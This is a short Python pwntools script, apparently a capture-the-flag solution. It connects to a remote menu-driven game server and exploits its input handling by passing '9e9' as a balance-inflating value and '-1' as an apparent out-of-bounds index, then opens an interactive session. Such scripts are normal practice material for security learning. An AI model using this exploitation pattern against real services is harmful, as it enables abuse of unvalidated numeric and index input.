#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

r = remote('138.68.67.161', 60004)

def choice(c):
    r.recvuntil('> ')
    r.sendline(c)

def store(level):
    choice('1')
    choice(level)

def work(x):
    choice('2')
    choice(x)
    r.recvuntil('Your balance: $')
    balance = float(r.recvuntil('\n'))
    return balance

def dragon():
    choice('3')

def home(t):
    choice('4')
    choice(t)

def storage(c):
    choice('5')
    choice(c)

balance = work('9e9')
info(balance)
store('5')
storage('y')
home('-1')
storage('y')
work('1')
dragon()

r.interactive()

